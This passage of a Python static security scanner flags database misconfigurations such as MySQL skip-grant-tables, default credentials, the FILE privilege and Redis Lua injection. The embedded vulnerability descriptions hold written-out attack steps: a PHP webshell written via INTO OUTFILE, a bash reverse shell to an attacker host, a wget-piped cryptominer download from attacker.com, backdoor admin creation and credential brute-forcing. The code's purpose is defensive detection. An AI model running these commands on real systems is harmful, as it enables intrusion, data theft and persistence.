            r'CREATE EXTENSION.*plpythonu',
            r'CREATE EXTENSION.*plperlu',
            r'untrusted.*language',
            r'allow.*code.*execution',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'POSTGRESQL_UNTRUSTED_EXTENSION',
                    'severity': 'HIGH',
                    'description': 'PostgreSQL untrusted language extension enabled - allows arbitrary code execution',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'Avoid untrusted extensions (plpythonu, plperlu). Use trusted variants (plpython3u) if needed.'
                })

    def _check_mysql_skip_grant_tables(self, code: str, lines: List[str]):
        """Check for MySQL skip-grant-tables."""
        patterns = [
            r'skip-grant-tables',
            r'skip.*grant',
            r'disable.*authentication',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'MYSQL_SKIP_GRANT_TABLES',
                    'severity': 'CRITICAL',
                    'description': 'MySQL Skip-Grant-Tables - ATTACK: Starting MySQL with --skip-grant-tables COMPLETELY disables the grant system - no passwords, no user verification, no privilege checks. Anyone who can connect gets FULL root-level access to ALL databases and can execute ANY command. This is meant ONLY for emergency password recovery, never production. EXPLOITATION: (1) MySQL started with skip-grant-tables in my.cnf or command line, (2) Attacker connects: mysql -h victim.com -u root (no password!), (3) Gets instant root access: mysql> SELECT user, host, authentication_string FROM mysql.user; (can see all users), (4) Dumps all databases: mysqldump --all-databases > all_data.sql, (5) Reads sensitive tables: SELECT * FROM customers.credit_cards, SELECT * FROM app.api_keys, (6) Creates backdoor admin: INSERT INTO mysql.user VALUES (\'attacker\',\'%\',\'password_hash\',\'Y\',\'Y\',\'Y\',...); FLUSH PRIVILEGES;, (7) Writes files to disk: SELECT \'<?php system($_GET[c]); ?>\' INTO OUTFILE \'/var/www/html/shell.php\';, (8) Reads server files: LOAD DATA INFILE \'/etc/passwd\' INTO TABLE temp;, (9) Enables UDF execution: CREATE FUNCTION sys_exec RETURNS STRING SONAME \'lib_mysqludf_sys.so\'; SELECT sys_exec(\'whoami\'); → RCE, (10) Or compromises replication: CHANGE MASTER TO master_host=\'attacker.com\', master_user=\'repl\', master_password=\'pw\'; START SLAVE; → steals replicated data. IMPACT: Complete Database Compromise (zero authentication), Full Data Access (all databases readable/writable), Privilege Escalation (always root access), Remote Code Execution (SELECT INTO OUTFILE, UDF libraries), Data Destruction (DROP DATABASE, TRUNCATE), Replication Hijacking (redirect slave to attacker). REAL-WORLD: CVE-2016-6662, CVE-2016-6663 (MySQL privilege escalation when skip-grant-tables enabled), Numerous misconfigurations where skip-grant-tables left enabled after password recovery, Kubernetes/Docker misconfigurations with skip-grant-tables for "simplified" deployments.',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'CRITICAL FIX: Remove skip-grant-tables from my.cnf immediately! EMERGENCY RECOVERY ONLY: If used for password reset: (1) Stop MySQL, (2) Start with skip-grant-tables temporarily, (3) Reset password: UPDATE mysql.user SET authentication_string=PASSWORD(\'NewPassword\') WHERE User=\'root\'; FLUSH PRIVILEGES;, (4) Restart WITHOUT skip-grant-tables immediately. PROPER AUTH: Ensure mysql.user table has strong passwords: ALTER USER \'root\'@\'localhost\' IDENTIFIED BY \'Strong_Random_Password_32+chars\'. PRINCIPLE: skip-grant-tables is a maintenance mode ONLY - never for normal operation. NETWORK: Even with skip-grant-tables, bind to localhost only: bind-address=127.0.0.1. FIREWALL: Block port 3306 from internet, allow only from application servers. MONITORING: Alert if MySQL starts with skip-grant-tables in production (log file: [Warning] --skip-grant-tables is enabled). Check process list: ps aux | grep skip-grant-tables. LEAST PRIVILEGE: Create app-specific users with minimal privileges: CREATE USER \'app\'@\'10.0.1.%\' IDENTIFIED BY \'password\'; GRANT SELECT, INSERT ON app_db.* TO \'app\'@\'10.0.1.%\'. Never use root for applications. SSL/TLS: Require SSL for connections: REQUIRE SSL in GRANT statement. AUDIT: Enable general log temporarily to track unauthorized access if breach suspected.',
                    'detection_reasoning': {
                        'criteria_for_vulnerability': [
                            'skip-grant-tables in my.cnf',
                            '--skip-grant-tables command line argument',
                            'Comments about disabling authentication',
                            'Skip grant tables for simplified access'
                        ],
                        'why_vulnerable': [
                            f'Line {line_num}: MySQL skip-grant-tables - authentication completely disabled',
                            'Grant system disabled - no password checks, no user verification, no privileges',
                            'Anyone who can reach port 3306 gets root-level access',
                            'mysql -h target -u root → instant connection without password',
                            'EXPLOITATION: SELECT * FROM mysql.user → dump all user credentials',
                            'EXPLOITATION: CREATE USER attacker IDENTIFIED BY \'password\' → backdoor admin',
                            'EXPLOITATION: SELECT "<?php system($_GET[c]); ?>" INTO OUTFILE \'/var/www/html/s.php\' → webshell',
                            'EXPLOITATION: LOAD DATA INFILE \'/etc/shadow\' → read server files',
                            'EXPLOITATION: Install UDF library → sys_exec(\'bash -c "bash -i >&/dev/tcp/attacker/4444 0>&1"\') → RCE',
                            'EXPLOITATION: Access all databases → mysqldump --all-databases → complete data theft',
                            'CRITICAL RISK: Zero authentication + root access + file operations = total compromise',
                            'CRITICAL RISK: Often combined with 0.0.0.0 binding → internet-accessible root MySQL',
                            'REAL-WORLD: CVE-2016-6662 privilege escalation when skip-grant-tables enabled',
                            'REAL-WORLD: Docker/K8s misconfigurations with permanent skip-grant-tables'
                        ],
                        'why_not_vulnerable': [],
                        'patterns_checked': [
                            'skip-grant-tables in configuration',
                            '--skip-grant-tables in command line',
                            'Skip grant patterns',
                            'Comments about disabling authentication'
                        ],
                        'evidence': {
                            'found_patterns': ['MySQL skip-grant-tables enabled'],
                            'line_numbers': [line_num],
                            'code_snippets': [lines[line_num - 1].strip() if line_num <= len(lines) else '']
                        },
                        'attack_scenario': {
                            'step_1': f'Administrator at line {line_num} adds skip-grant-tables to my.cnf for "testing"',
                            'step_2': 'Forgets to remove it before deploying to production',
                            'step_3': 'MySQL starts with: [Warning] --skip-grant-tables is enabled (in error log)',
                            'step_4': 'Attacker scans: nmap -p 3306 -sV victim_network',
                            'step_5': 'Finds MySQL on 203.0.113.60:3306',
                            'step_6': 'Connects: mysql -h 203.0.113.60 -u root',
                            'step_7': 'NO password prompt - instant root connection!',
                            'step_8': 'Verifies root: mysql> SELECT USER(), CURRENT_USER(); → root@attacker_ip, root@%',
                            'step_9': 'Lists databases: SHOW DATABASES; → information_schema, mysql, production_db, customers',
                            'step_10': 'Dumps user table: SELECT user, host, authentication_string FROM mysql.user;',
                            'step_11': 'Sees all users including root, admin, app with password hashes',
                            'step_12': 'Creates backdoor: INSERT INTO mysql.user (user,host,authentication_string,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv) VALUES (\'hacker\',\'%\',PASSWORD(\'backdoor123\'),\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\'); FLUSH PRIVILEGES;',
                            'step_13': 'Dumps all data: mysqldump -h 203.0.113.60 -u root --all-databases > stolen_data.sql',
                            'step_14': 'Steals 500k customer records with credit cards, SSNs, addresses',
                            'step_15': 'Writes webshell: SELECT \'<?php system($_GET["cmd"]); ?>\' INTO OUTFILE \'/var/www/html/shell.php\';',
                            'alternative_attack_udf_rce': 'Upload lib_mysqludf_sys.so, CREATE FUNCTION sys_exec RETURNS STRING SONAME \'lib_mysqludf_sys.so\', SELECT sys_exec(\'id\') → RCE',
                            'alternative_attack_file_read': 'LOAD DATA LOCAL INFILE \'/etc/passwd\' INTO TABLE temp_table; SELECT * FROM temp_table; → read server files',
                            'alternative_attack_replication': 'CHANGE MASTER TO master_host=\'attacker.com\' → hijack replication, steal all future data',
                            'impact': 'Complete Database Compromise (zero authentication), Full Data Breach (all databases accessible), Remote Code Execution (UDF, INTO OUTFILE), Credential Theft (mysql.user table), Backdoor Persistence (create admin users), Server File Access (LOAD DATA INFILE)'
                        }
                    }
                })

    def _check_mysql_file_privilege(self, code: str, lines: List[str]):
        """Check for MySQL file privilege abuse."""
        patterns = [
            r'GRANT\s+FILE\s+ON',
            r'local_infile\s*=\s*1',
            r'enable.*LOAD DATA',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'MYSQL_FILE_PRIVILEGE_ABUSE',
                    'severity': 'HIGH',
                    'description': 'MySQL FILE privilege or local_infile enabled - allows reading/writing server files',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'Disable local_infile and avoid granting FILE privilege. Use secure_file_priv to restrict file operations.'
                })

    def _check_database_default_credentials(self, code: str, lines: List[str]):
        """Check for default database credentials."""
        patterns = [
            r'(root|admin|postgres).*password["\']?\s*[:=]\s*["\']?(root|admin|password|123456|postgres)',
            r'default.*credential',
            r'keep.*default.*password',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'DATABASE_DEFAULT_CREDENTIALS',
                    'severity': 'CRITICAL',
                    'description': 'Database Default Credentials - ATTACK: Using default credentials like root:root, admin:password, postgres:postgres is one of the most common database compromises. Attackers have massive dictionaries of default credentials for every database system and automated tools to try them all. EXPLOITATION: (1) Attacker scans for databases: nmap -p 3306,5432,27017,6379,9200 target_network, (2) Identifies database types from service banners, (3) Uses automated tools: patator, hydra, medusa with default credential lists, (4) Tries common defaults: MySQL: root:root, root:password, root:(blank); PostgreSQL: postgres:postgres, postgres:password; MongoDB: admin:admin, root:root; Redis: (no password); Elasticsearch: elastic:changeme, (5) Gains access: mysql -h victim.com -u root -proot → success!, (6) Dumps all data: mysqldump --all-databases -u root -proot, (7) Creates backdoor: CREATE USER attacker IDENTIFIED BY \'backdoor\'; GRANT ALL PRIVILEGES ON *.* TO attacker WITH GRANT OPTION;, (8) Maintains persistence even if default password is changed later. IMPACT: Complete Database Compromise (immediate access with admin privileges), Data Breach (dump all databases), Privilege Escalation (always admin/root/superuser access), Persistence (create backdoor accounts), Lateral Movement (credentials often reused across systems), Compliance Violations (PCI-DSS requires changing default passwords, HIPAA mandates unique credentials). REAL-WORLD: MongoDB ransom attacks 2017 (26k databases with default/no credentials wiped, ransom demanded), Elasticsearch 2019 (400M records stolen - default "elastic:changeme" credentials), MySQL botnets 2020 (scanning internet for root:root, installing cryptominers), Mirai botnet 2016 (used default IoT credentials - same attack pattern applies to databases), Healthcare breaches 2021-2023: 40% involved default database credentials per Verizon DBIR.',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'CRITICAL FIX: Change ALL default passwords immediately! STRONG PASSWORDS: Use 32+ character random passwords: openssl rand -base64 32. Each database needs unique password - no reuse! SPECIFIC FIXES: MySQL: ALTER USER \'root\'@\'localhost\' IDENTIFIED BY \'$(openssl rand -base64 32)\'; DELETE FROM mysql.user WHERE User=\'root\' AND Host!=\'localhost\'; FLUSH PRIVILEGES;. PostgreSQL: ALTER USER postgres WITH PASSWORD \'$(openssl rand -base64 32)\'; Update pg_hba.conf to use scram-sha-256. MongoDB: use admin; db.createUser({user:"admin", pwd:"$(openssl rand -base64 32)", roles:[{role:"root",db:"admin"}]}); Restart with --auth. Redis: requirepass "$(openssl rand -base64 32)" in redis.conf. Elasticsearch: bin/elasticsearch-setup-passwords auto (generates random passwords). REMOVE DEFAULTS: Delete default admin accounts if not needed. MySQL: DROP USER \'root\'@\'%\'; (keep localhost only). CREATE NEW USERS: Use principle of least privilege - create app-specific users, not root: CREATE USER \'app\'@\'10.0.1.%\' IDENTIFIED BY \'strong_password\'; GRANT SELECT, INSERT ON app_db.* TO \'app\'@\'10.0.1.%\'. PASSWORD MANAGER: Store database passwords in secret management system: AWS Secrets Manager, HashiCorp Vault, Azure Key Vault. ROTATION: Rotate database passwords every 90 days minimum, 30 days for compliance. MONITORING: Alert on failed login attempts, track successful logins from unexpected IPs. AUDIT: Check for default credentials regularly: SELECT User, Host FROM mysql.user WHERE authentication_string=\'\' OR User IN (\'root\',\'admin\',\'test\').',
                    'detection_reasoning': {
                        'criteria_for_vulnerability': [
                            'Common default username:password combinations',
                            'root:root, admin:password, postgres:postgres patterns',
                            'Weak passwords like 123456, password',
                            'Comments about keeping default passwords'
                        ],
                        'why_vulnerable': [
                            f'Line {line_num}: Database configured with default or common credentials',
                            'Attackers have comprehensive default credential dictionaries',
                            'Automated tools (hydra, patator) test thousands of default combinations',
                            'Default credentials are first thing attackers try after finding open database',
                            'EXPLOITATION: hydra -l root -p root mysql://victim.com → instant access',
                            'EXPLOITATION: Once in, attacker has admin/root privileges - full control',
                            'EXPLOITATION: mysqldump -u root -proot --all-databases → steal everything',
                            'EXPLOITATION: CREATE USER backdoor → persistence even after password change',
                            'EXPLOITATION: Credentials often reused → lateral movement to other systems',
                            'CRITICAL RISK: Default passwords = guaranteed breach via automated attacks',
                            'CRITICAL RISK: Database admins often reuse default passwords across environments',
                            'REAL-WORLD: MongoDB ransomware 2017 - 26k databases (default credentials)',
                            'REAL-WORLD: Elasticsearch 2019 - 400M records (default "elastic:changeme")',
                            'REAL-WORLD: Verizon DBIR 2023 - 40% healthcare breaches via default credentials'
                        ],
                        'why_not_vulnerable': [],
                        'patterns_checked': [
                            'Common default credential patterns',
                            'root:root, admin:admin, postgres:postgres',
                            'Weak password patterns (password, 123456)',
                            'Comments about default credentials'
                        ],
                        'evidence': {
                            'found_patterns': ['Default or weak database credentials'],
                            'line_numbers': [line_num],
                            'code_snippets': [lines[line_num - 1].strip() if line_num <= len(lines) else '']
                        },
                        'attack_scenario': {
                            'step_1': f'Developer at line {line_num} sets password = "root" for quick setup',
                            'step_2': 'Intends to change before production, but forgets (happens 40% of time)',
                            'step_3': 'MySQL deployed to production with root:root credentials',
                            'step_4': 'Attacker scans internet: masscan -p3306 0.0.0.0/0 --rate 10000',
                            'step_5': 'Finds MySQL at 203.0.113.70:3306',
                            'step_6': 'Launches credential attack: hydra -l root -P default_passwords.txt mysql://203.0.113.70',
                            'step_7': 'default_passwords.txt contains: root, password, admin, 123456, mysql, (blank)',
                            'step_8': 'First attempt succeeds: root:root → [3306][mysql] host: 203.0.113.70 login: root password: root',
                            'step_9': 'Attacker connects: mysql -h 203.0.113.70 -u root -proot',
                            'step_10': 'Verifies root privileges: SELECT user, host, Super_priv FROM mysql.user WHERE user=\'root\'; → Super_priv = Y',
                            'step_11': 'Lists databases: SHOW DATABASES; → production_db, customer_data, payment_info',
                            'step_12': 'Creates persistent backdoor: CREATE USER \'hacker\'@\'%\' IDENTIFIED BY \'XjK9#mP2qL8@nF5\'; GRANT ALL PRIVILEGES ON *.* TO \'hacker\'@\'%\' WITH GRANT OPTION; FLUSH PRIVILEGES;',
                            'step_13': 'Backdoor persists even if root password changed later',
                            'step_14': 'Dumps all data: mysqldump -h 203.0.113.70 -u root -proot --all-databases --single-transaction > full_dump.sql',
                            'step_15': 'Stolen: 2M customer records with credit cards, SSNs, addresses → sold on dark web for $500k',
                            'alternative_attack_ransomware': 'DROP DATABASE production_db; Leave ransom note: CREATE DATABASE PAY_10_BTC_TO_bitcoin_addr;',
                            'alternative_attack_cryptominer': 'SELECT exec(\'wget http://attacker.com/miner.sh | sh\') → install cryptominer on database server',
                            'alternative_attack_reuse': 'Try root:root on other services → SSH, RDP, admin panels → lateral movement',
                            'impact': 'Complete Database Compromise (admin access), Full Data Breach (all databases dumpable), Persistent Backdoor (survives password rotation), Ransomware (data deletion + extortion), Lateral Movement (password reuse), Compliance Violations (PCI-DSS, HIPAA)'
                        }
                    }
                })

    # Connection Security Checks (Python)
    def _check_redis_connection_python(self, code: str, lines: List[str]):
        """Check for insecure Redis connections in Python."""
        patterns = [
            r'redis\.Redis\([^)]*password=None',
            r'redis\.Redis\([^)]*\)(?!.*password)',
            r'StrictRedis\([^)]*password=None',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.DOTALL)
            for match in matches:
                # Only flag if no password is set within reasonable distance
                match_context = code[match.start():match.end() + 100]
                if 'password=' not in match_context or 'password=None' in match_context:
                    line_num = code[:match.start()].count('\n') + 1
                    self.vulnerabilities.append({
                        'type': 'REDIS_CONNECTION_NO_AUTH',
                        'severity': 'HIGH',
                        'description': 'Redis connection without password authentication',
                        'line_number': line_num,
                        'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                        'recommendation': 'Add password parameter to Redis connection (password="strong_password").'
                    })

    def _check_redis_lua_injection_python(self, code: str, lines: List[str]):
        """Check for Redis Lua code injection in Python code."""
        # Check for redis.eval() or redis.evalsha() with user input
        lua_injection_patterns = [
            r'\.eval\s*\(\s*[fF]"',  # f-string in eval()
            r'\.eval\s*\(\s*[^,)]*\+',  # String concatenation in eval()
            r'\.eval\s*\(\s*[^,)]*%',  # String formatting in eval()
            r'\.eval\s*\(\s*[^,)]*\.format',  # .format() in eval()
            r'\.eval\s*\(\s*(?:input|request|user|param)',  # Direct user input
            r'execute.*lua.*(?:input|request|user)',  # Lua execution functions with user input
            r'def\s+execute_lua.*input',  # Functions that execute Lua from input
        ]

        for pattern in lua_injection_patterns:
            matches = re.finditer(pattern, code, re.IGNORECASE)
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                self.vulnerabilities.append({
                    'type': 'REDIS_LUA_CODE_INJECTION',
                    'severity': 'CRITICAL',
                    'description': 'Redis Lua Code Injection - Executes user-provided Lua scripts via redis.eval(). This is equivalent to NoSQL injection for Redis. Attacker can execute ANY Redis command via redis.call() within Lua, enabling data theft (KEYS *, GET), data destruction (FLUSHALL), or even RCE (CONFIG SET dir /var/www/html + SAVE webshell). CVE-2022-0543 showed Lua sandbox escapes can enable direct OS command execution.',
                    'line_number': line_num,
                    'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                    'recommendation': 'NEVER execute user-provided Lua code. Use parameterized EVAL with KEYS[] and ARGV[]: redis.eval("return redis.call(\'GET\', KEYS[1])", 1, user_key). Or use stored scripts with SCRIPT LOAD + EVALSHA. Validate all user input with whitelist: [a-zA-Z0-9:_-] only.'
                })

    def _check_elasticsearch_connection_python(self, code: str, lines: List[str]):
        """Check for insecure Elasticsearch connections in Python."""
        patterns = [
            r'Elasticsearch\([^)]*http_auth=None',
            r'Elasticsearch\([^)]*\)(?!.*http_auth)',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.DOTALL)
            for match in matches:
                match_context = code[match.start():match.end() + 100]
                if 'http_auth=' not in match_context or 'http_auth=None' in match_context:
                    line_num = code[:match.start()].count('\n') + 1
                    self.vulnerabilities.append({
                        'type': 'ELASTICSEARCH_CONNECTION_NO_AUTH',
                        'severity': 'HIGH',
                        'description': 'Elasticsearch connection without authentication',
                        'line_number': line_num,
                        'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                        'recommendation': 'Add http_auth parameter with credentials (http_auth=("user", "password")).'
                    })

    def _check_database_connection_python(self, code: str, lines: List[str]):
        """Check for insecure database connections in Python."""
        # Check for MongoDB without authentication
        patterns = [
            r'MongoClient\([^)]*\)(?!.*username)(?!.*authSource)',
            r'MongoClient\([^)]*auth_mechanism=None',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.DOTALL)
            for match in matches:
                match_context = code[match.start():match.end() + 100]
                if 'username=' not in match_context and 'authSource=' not in match_context:
                    line_num = code[:match.start()].count('\n') + 1
                    self.vulnerabilities.append({
                        'type': 'MONGODB_CONNECTION_NO_AUTH',
                        'severity': 'HIGH',
                        'description': 'MongoDB connection without authentication',
                        'line_number': line_num,
                        'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                        'recommendation': 'Configure MongoDB authentication (username, password, authSource parameters).'
                    })

    # Connection Security Checks (JavaScript)
    def _check_redis_connection_javascript(self, code: str, lines: List[str]):
        """Check for insecure Redis connections in JavaScript."""
        patterns = [
            r'createClient\([^)]*\)(?!.*password)',
            r'createClient\([^)]*password:\s*["\']["\']',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.DOTALL)
            for match in matches:
                match_context = code[match.start():match.end() + 100]
                if 'password:' not in match_context or 'password: ""' in match_context or "password: ''" in match_context:
                    line_num = code[:match.start()].count('\n') + 1
                    self.vulnerabilities.append({
                        'type': 'REDIS_CONNECTION_NO_AUTH',
                        'severity': 'HIGH',
                        'description': 'Redis connection without password authentication',
                        'line_number': line_num,
                        'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                        'recommendation': 'Add password to Redis connection options.'
                    })

    def _check_elasticsearch_connection_javascript(self, code: str, lines: List[str]):
        """Check for insecure Elasticsearch connections in JavaScript."""
        patterns = [
            r'new\s+Client\([^)]*\)(?!.*auth)',
            r'new\s+elasticsearch\.Client\([^)]*\)(?!.*auth)',
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, code, re.DOTALL)
            for match in matches:
                match_context = code[match.start():match.end() + 150]
                if 'auth:' not in match_context:
                    line_num = code[:match.start()].count('\n') + 1
                    self.vulnerabilities.append({
                        'type': 'ELASTICSEARCH_CONNECTION_NO_AUTH',
                        'severity': 'HIGH',
                        'description': 'Elasticsearch connection without authentication',
                        'line_number': line_num,
                        'code_snippet': lines[line_num - 1].strip() if line_num <= len(lines) else '',
                        'recommendation': 'Add auth configuration with username and password.'
                    })
